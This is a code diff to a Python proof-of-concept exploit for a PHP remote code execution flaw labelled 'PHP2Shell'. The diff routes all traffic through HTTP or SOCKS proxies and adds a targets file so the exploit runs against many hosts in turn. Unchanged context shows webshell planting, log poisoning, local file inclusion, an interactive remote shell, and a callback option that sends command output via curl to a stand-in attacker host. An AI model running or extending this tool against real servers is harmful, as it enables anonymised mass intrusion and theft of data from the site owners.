@@ -30,13 +30,115 @@ import sys
 import urllib.request
 import urllib.error
 import urllib.parse
+import base64
 from typing import Optional
 
 # ─── helpers ────────────────────────────────────────────────────────────────
 
+_PROXY_URL: Optional[str] = None
+_PROXY_PARTS = None
+_URL_OPENER = None
+_SOCKS = None
+_ORIGINAL_SOCKET = socket.socket
+
+
+def configure_proxy(proxy_url: Optional[str]) -> None:
+    """Configure HTTP(S) and SOCKS proxying for urllib and raw sockets."""
+    global _PROXY_URL, _PROXY_PARTS, _URL_OPENER, _SOCKS
+    _PROXY_URL = proxy_url
+    _PROXY_PARTS = urllib.parse.urlparse(proxy_url) if proxy_url else None
+    _SOCKS = None
+    socket.socket = _ORIGINAL_SOCKET
+
+    if not proxy_url:
+        _URL_OPENER = urllib.request.build_opener()
+        return
+
+    scheme = (_PROXY_PARTS.scheme or "").lower()
+    if scheme in ("http", "https"):
+        _URL_OPENER = urllib.request.build_opener(
+            urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
+        )
+    elif scheme in ("socks5", "socks5h", "socks4", "socks4a"):
+        try:
+            import socks as _socks
+        except ImportError as exc:
+            raise RuntimeError(
+                "SOCKS proxy support requires PySocks; install it with: pip install PySocks"
+            ) from exc
+        _SOCKS = _socks
+        # urllib's HTTP client ultimately calls socket.create_connection;
+        # route those connections through the configured SOCKS proxy too.
+        socket.socket = _socks.socksocket
+        proxy_type = {
+            "socks4": _socks.SOCKS4,
+            "socks4a": _socks.SOCKS4,
+            "socks5": _socks.SOCKS5,
+            "socks5h": _socks.SOCKS5,
+        }[scheme]
+        _socks.set_default_proxy(
+            proxy_type,
+            _PROXY_PARTS.hostname,
+            _PROXY_PARTS.port or 1080,
+            rdns=scheme in ("socks5", "socks5h", "socks4a"),
+            username=_PROXY_PARTS.username,
+            password=_PROXY_PARTS.password,
+        )
+        _URL_OPENER = urllib.request.build_opener()
+    else:
+        raise ValueError("Unsupported proxy scheme; use http://, https://, socks5://, or socks5h://")
+
+
+def open_url(req, timeout: int = 10, context=None):
+    """Open a URL using the configured proxy and optional TLS context."""
+    if context is not None:
+        handlers = [urllib.request.HTTPSHandler(context=context)]
+        if _PROXY_PARTS and _PROXY_PARTS.scheme in ("http", "https"):
+            handlers.insert(0, urllib.request.ProxyHandler(
+                {"http": _PROXY_URL, "https": _PROXY_URL}
+            ))
+        return urllib.request.build_opener(*handlers).open(req, timeout=timeout)
+    return (_URL_OPENER or urllib.request.build_opener()).open(req, timeout=timeout)
+
+
+def _connect_via_http_proxy(host: str, port: int) -> socket.socket:
+    proxy_host = _PROXY_PARTS.hostname
+    proxy_port = _PROXY_PARTS.port or 8080
+    s = socket.create_connection((proxy_host, proxy_port), timeout=30)
+    authority = f"{host}:{port}"
+    headers = [
+        f"CONNECT {authority} HTTP/1.1",
+        f"Host: {authority}",
+        "Proxy-Connection: Keep-Alive",
+    ]
+    if _PROXY_PARTS.username is not None:
+        credentials = f"{_PROXY_PARTS.username}:{_PROXY_PARTS.password or ''}".encode()
+        headers.append("Proxy-Authorization: Basic " + base64.b64encode(credentials).decode())
+    s.sendall(("\r\n".join(headers) + "\r\n\r\n").encode())
+    response = b""
+    while b"\r\n\r\n" not in response:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        response += chunk
+    status = response.split(b"\r\n", 1)[0].decode(errors="replace")
+    if len(status.split()) < 2 or status.split()[1] != "200":
+        s.close()
+        raise OSError(f"Proxy CONNECT failed: {status or 'no response'}")
+    return s
+
+
 def make_socket(host: str, port: int, use_tls: bool,
                 verify: bool = True, cafile: Optional[str] = None) -> socket.socket:
-    s = socket.create_connection((host, port), timeout=30)
+    scheme = (_PROXY_PARTS.scheme or "").lower() if _PROXY_PARTS else ""
+    if scheme in ("http", "https"):
+        s = _connect_via_http_proxy(host, port)
+    elif scheme in ("socks4", "socks4a", "socks5", "socks5h"):
+        if _SOCKS is None:
+            raise RuntimeError("SOCKS proxy is not configured")
+        s = _SOCKS.create_connection((host, port), timeout=30)
+    else:
+        s = socket.create_connection((host, port), timeout=30)
     if use_tls:
         ctx = ssl.create_default_context(cafile=cafile)
         if not verify:
@@ -58,7 +160,7 @@ def http_get(host: str, port: int, path: str, use_tls: bool,
         req.add_header("Cookie", cookie)
     req.add_header("User-Agent", "Mozilla/5.0")
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with open_url(req, timeout=timeout) as r:
             return r.status, r.read().decode(errors="replace")
     except urllib.error.HTTPError as e:
         return e.code, ""
@@ -73,7 +175,7 @@ def get_session_id(host: str, port: int, path: str, use_tls: bool) -> Optional[s
     req = urllib.request.Request(url)
     req.add_header("User-Agent", "Mozilla/5.0")
     try:
-        with urllib.request.urlopen(req, timeout=10) as r:
+        with open_url(req, timeout=10) as r:
             for h, v in r.headers.items():
                 if h.lower() == "set-cookie" and "PHPSESSID" in v:
                     for part in v.split(";"):
@@ -394,7 +496,7 @@ def discover_lfi_params(host: str, port: int, path: str, use_tls: bool) -> list:
         req = urllib.request.Request(url)
         req.add_header("User-Agent", "Mozilla/5.0")
         try:
-            with urllib.request.urlopen(req, timeout=8) as r:
+            with open_url(req, timeout=8) as r:
                 body = r.read().decode(errors="replace")
             # extract params from href/src/action attributes
             for m in re.finditer(r'''(?:href|src|action)=["']([^"']+)["']''', body):
@@ -580,7 +682,7 @@ def try_pear_webshell(host: str, port: int, path: str, use_tls: bool,
                 req = urllib.request.Request(url)
                 req.add_header("User-Agent", "Mozilla/5.0")
                 try:
-                    urllib.request.urlopen(req, timeout=5).close()
+                    open_url(req, timeout=5).close()
                 except Exception:
                     pass
 
@@ -589,7 +691,7 @@ def try_pear_webshell(host: str, port: int, path: str, use_tls: bool,
             req = urllib.request.Request(url)
             req.add_header("User-Agent", "Mozilla/5.0")
             try:
-                urllib.request.urlopen(req, timeout=5).close()
+                open_url(req, timeout=5).close()
             except Exception:
                 pass
 
@@ -599,7 +701,7 @@ def try_pear_webshell(host: str, port: int, path: str, use_tls: bool,
             req = urllib.request.Request(shell_url)
             req.add_header("User-Agent", "Mozilla/5.0")
             try:
-                with urllib.request.urlopen(req, timeout=5) as r:
+                with open_url(req, timeout=5) as r:
                     body = r.read().decode(errors="replace").strip()
                     if body:
                         print(f"    [pear] webshell at /{shell_name}")
@@ -632,7 +734,7 @@ def try_log_poison(host: str, port: int, path: str, use_tls: bool,
     req = urllib.request.Request(poison_url)
     req.add_header("User-Agent", payload_ua)
     try:
-        with urllib.request.urlopen(req, timeout=8):
+        with open_url(req, timeout=8):
             pass
     except Exception:
         pass  # response doesn't matter — we just need the log write
@@ -650,10 +752,9 @@ def try_log_poison(host: str, port: int, path: str, use_tls: bool,
                     ctx = _ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = _ssl.CERT_NONE
-                    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                 else:
-                    opener = urllib.request.build_opener()
-                with opener.open(req, timeout=8) as r:
+                    ctx = None
+                with open_url(req, timeout=8, context=ctx) as r:
                     body = r.read().decode(errors="replace")
                     out = extract_output(body)
                     if out is not None:
@@ -676,7 +777,7 @@ def detect_session_path(host: str, port: int, path: str, use_tls: bool) -> Optio
         req = urllib.request.Request(url)
         req.add_header("User-Agent", "Mozilla/5.0")
         try:
-            with urllib.request.urlopen(req, timeout=5) as r:
+            with open_url(req, timeout=5) as r:
                 body = r.read().decode(errors="replace")
                 m = re.search(r'session\.save_path</td><td[^>]*>\s*([^<\s]+)', body)
                 if m:
@@ -733,7 +834,7 @@ def interactive_shell(host: str, port: int, path: str, use_tls: bool,
                 req.add_header("Cookie", f"PHPSESSID={session_id}")
                 req.add_header("User-Agent", "Mozilla/5.0")
                 try:
-                    with urllib.request.urlopen(req, timeout=5) as r:
+                    with open_url(req, timeout=5) as r:
                         out = extract_output(r.read().decode(errors="replace"))
                         if out:
                             break
@@ -760,7 +861,7 @@ def probe(host: str, port: int, path: str, use_tls: bool) -> dict:
     req = urllib.request.Request(url)
     req.add_header("User-Agent", "Mozilla/5.0")
     try:
-        with urllib.request.urlopen(req, timeout=10) as r:
+        with open_url(req, timeout=10) as r:
             headers = dict(r.headers)
             result["server"] = headers.get("Server", headers.get("server", ""))
             powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
@@ -838,10 +939,7 @@ def try_lfi(host: str, port: int, path: str, use_tls: bool,
             else:
                 ctx = None
             try:
-                opener = urllib.request.build_opener(
-                    urllib.request.HTTPSHandler(context=ctx) if (use_tls and ctx) else urllib.request.HTTPHandler()
-                )
-                with opener.open(req, timeout=8) as r:
+                with open_url(req, timeout=8, context=ctx) as r:
                     body = r.read().decode(errors="replace")
                     out = extract_output(body)
                     if out is not None:
@@ -1037,6 +1135,36 @@ def exploit(host: str, port: int, path: str, use_tls: bool,
 
 # ─── CLI ─────────────────────────────────────────────────────────────────────
 
+def parse_target_url(raw_url: str):
+    """Parse a target URL into the connection values used by the PoC."""
+    parsed = urllib.parse.urlparse(raw_url)
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        raise ValueError(f"invalid target URL: {raw_url}")
+
+    use_tls = parsed.scheme == "https"
+    port = parsed.port or (443 if use_tls else 80)
+    path = parsed.path or "/"
+    if parsed.query:
+        path += "?" + parsed.query
+    return parsed.hostname, port, path, use_tls
+
+
+def read_target_file(filename: str) -> list[str]:
+    """Read one HTTP(S) target URL per line, ignoring blanks and comments."""
+    try:
+        with open(filename, encoding="utf-8") as target_file:
+            targets = [
+                line.strip()
+                for line in target_file
+                if line.strip() and not line.lstrip().startswith("#")
+            ]
+    except OSError as exc:
+        raise ValueError(f"cannot read target file '{filename}': {exc}") from exc
+    if not targets:
+        raise ValueError(f"target file '{filename}' is empty")
+    return targets
+
+
 def main():
     p = argparse.ArgumentParser(
         description="PHP2Shell CVE-2026-109618/109619 PoC — authorized research only",
@@ -1050,7 +1178,9 @@ def main():
             "  python3 poc.py https://target/ 'id' --no-verify\n"
         )
     )
-    p.add_argument("url",     help="Target PHP URL, e.g. http://192.168.1.10/index.php")
+    p.add_argument("url", nargs="?", help="Target PHP URL, e.g. http://192.168.1.10/index.php")
+    p.add_argument("--targets-file", metavar="FILE",
+                   help="Read one target URL per line; blank lines and # comments are ignored")
     p.add_argument("command", nargs="?", default="id",
                    help="OS command to execute (default: id)")
     p.add_argument("--lfi-param", default=None, metavar="PARAM",
@@ -1069,44 +1199,60 @@ def main():
                    help="Disable TLS certificate verification (lab/self-signed only — MITM risk)")
     p.add_argument("--cafile", default=None,
                    help="Path to CA bundle for TLS verification")
+    p.add_argument("--proxy", default=None, metavar="URL",
+                   help="Proxy URL: http://host:port, https://host:port, socks5://host:port, or socks5h://host:port")
     p.add_argument("--interactive", "-i", action="store_true",
                    help="Drop into interactive shell after first successful RCE (requires --lfi-param)")
     p.add_argument("--callback", default=None, metavar="URL",
                    help="Blind RCE: exfiltrate output OOB via curl to URL (e.g. http://attacker.com/x)")
     args = p.parse_args()
 
-    parsed = urllib.parse.urlparse(args.url)
-    use_tls = parsed.scheme == "https"
-    host = parsed.hostname
-    port = parsed.port or (443 if use_tls else 80)
-    path = parsed.path or "/"
-    if parsed.query:
-        path += "?" + parsed.query
+    # With --targets-file, the optional positional slot is the command so
+    # `poc.py --targets-file targets.txt "id"` remains natural to use.
+    if args.targets_file and args.url:
+        if args.command != "id":
+            p.error("with --targets-file, provide only one positional command")
+        args.command, args.url = args.url, None
+    if args.url and args.targets_file:
+        p.error("specify either a positional URL or --targets-file, not both")
+    if not args.url and not args.targets_file:
+        p.error("a target URL or --targets-file is required")
 
-    if not host:
-        print("[-] Invalid URL")
-        sys.exit(1)
+    try:
+        configure_proxy(args.proxy)
+    except (RuntimeError, ValueError) as exc:
+        p.error(str(exc))
 
-    if args.probe_only:
-        info = probe(host, port, path, use_tls)
-        print(f"Server              : {info['server']}")
-        print(f"PHP detected        : {info['php']}")
-        print(f"upload_progress rw  : {info['upload_progress_writable']}")
-        sys.exit(0)
+    try:
+        raw_targets = [args.url] if args.url else read_target_file(args.targets_file)
+        parsed_targets = [parse_target_url(raw_url) for raw_url in raw_targets]
+    except ValueError as exc:
+        p.error(str(exc))
 
-    exploit(
-        host, port, path, use_tls,
-        command=args.command,
-        rounds=args.rounds,
-        modes=args.modes,
-        chunk_size=args.chunk_size,
-        chunk_delay=args.chunk_delay,
-        lfi_param=args.lfi_param,
-        verify=not args.no_verify,
-        cafile=args.cafile,
-        interactive=args.interactive,
-        callback=args.callback,
-    )
+    for index, (raw_url, target) in enumerate(zip(raw_targets, parsed_targets), start=1):
+        if len(parsed_targets) > 1:
+            print(f"\n{'=' * 72}\n[*] Target {index}/{len(parsed_targets)}: {raw_url}\n{'=' * 72}")
+        host, port, path, use_tls = target
+        if args.probe_only:
+            info = probe(host, port, path, use_tls)
+            print(f"Server              : {info['server']}")
+            print(f"PHP detected        : {info['php']}")
+            print(f"upload_progress rw  : {info['upload_progress_writable']}")
+            continue
+
+        exploit(
+            host, port, path, use_tls,
+            command=args.command,
+            rounds=args.rounds,
+            modes=args.modes,
+            chunk_size=args.chunk_size,
+            chunk_delay=args.chunk_delay,
+            lfi_param=args.lfi_param,
+            verify=not args.no_verify,
+            cafile=args.cafile,
+            interactive=args.interactive,
+            callback=args.callback,
+        )
 
 
 if __name__ == "__main__":
